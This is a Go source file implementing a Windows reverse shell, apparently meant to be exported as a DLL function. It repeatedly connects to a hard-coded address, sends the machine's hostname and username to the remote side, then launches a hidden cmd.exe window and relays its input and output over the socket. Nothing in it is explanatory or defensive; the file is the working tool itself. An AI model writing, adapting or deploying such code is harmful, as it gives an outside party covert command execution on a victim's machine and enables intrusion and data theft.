package main

import (
	"fmt"
	"net"
	"io"
	"time"
	"os"
	"os/exec"
	"syscall"
)
import "C"

var ioDead = make(chan bool)

func readAndWrite(input io.Reader, output io.Writer) {
	buffer := make([]byte, 4096)
	for {
		n, err := input.Read(buffer)
		if n > 0 {
			_, err := output.Write(buffer[:n])
			if err != nil {
				break;
			}
		}
		if err != nil {
			break
		}
	}
	ioDead <- true
}

//export rshell
func rshell() {
	for {
		conn, err := net.Dial("tcp", "127.0.0.1:12341")
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		buffer := make([]byte, 4)

		// First message will be "INFO", this line will block until buffer full
		_, err = io.ReadFull(conn, buffer)
		if err != nil {		// Server disconnect or read error
			conn.Close()
			continue
		} else if string(buffer) != "INFO" {	// Got weird message
			conn.Close()
			return
		}
		
		// Get info and send back to server
		username := os.Getenv("USERNAME")
		if username == "" {
			username = os.Getenv("USER")
		}
		hostname, err := os.Hostname()
		if err != nil {
			hostname = ""
		}
		info := fmt.Sprintf("Hostname: %s\tName: %s", hostname, username)
		if len(info) > 255 {	// Info too long
			info = info[:256]
		}
		sbuffer := make([]byte, 4 + 1 + 255)
		copy(sbuffer, "INFO")
		sbuffer[4] = uint8(len(info))	// First byte indicates info length
		copy(sbuffer[5:], info)
		_, err = conn.Write(sbuffer)
		if err != nil {
			conn.Close()
			continue
		}

		// Second message will be "STSH", this line will block until buffer full
		_, err = io.ReadFull(conn, buffer)
		if err != nil {		// Server disconnect or read error
			conn.Close()
			continue
		} else if string(buffer) != "STSH" {	// Got weird message
			conn.Close()
			return
		}

		// Start shell
		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", "chcp", "65001")	// Set cmd code page to utf-8
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	// Hide windows of new spawn process
		stdout, err1 := cmd.StdoutPipe()
		stderr, err2 := cmd.StderrPipe()
		stdin, err3 := cmd.StdinPipe()
		if err1 != nil || err2 != nil || err3 != nil {
			conn.Close()
			continue
		}
		err = cmd.Start()
		if err != nil {
			conn.Close()
			continue
		}

		go readAndWrite(stdout, conn)
		go readAndWrite(stderr, conn)
		go readAndWrite(conn, stdin)
		<- ioDead		// Wait any of above goroutine finish (maybe conn close or cmd exit), then kill process
		err = cmd.Process.Kill()
		conn.Close()
		stdout.Close()
		stderr.Close()
		stdin.Close()
		<- ioDead
		<- ioDead
	}
}

func main() {
	rshell()
}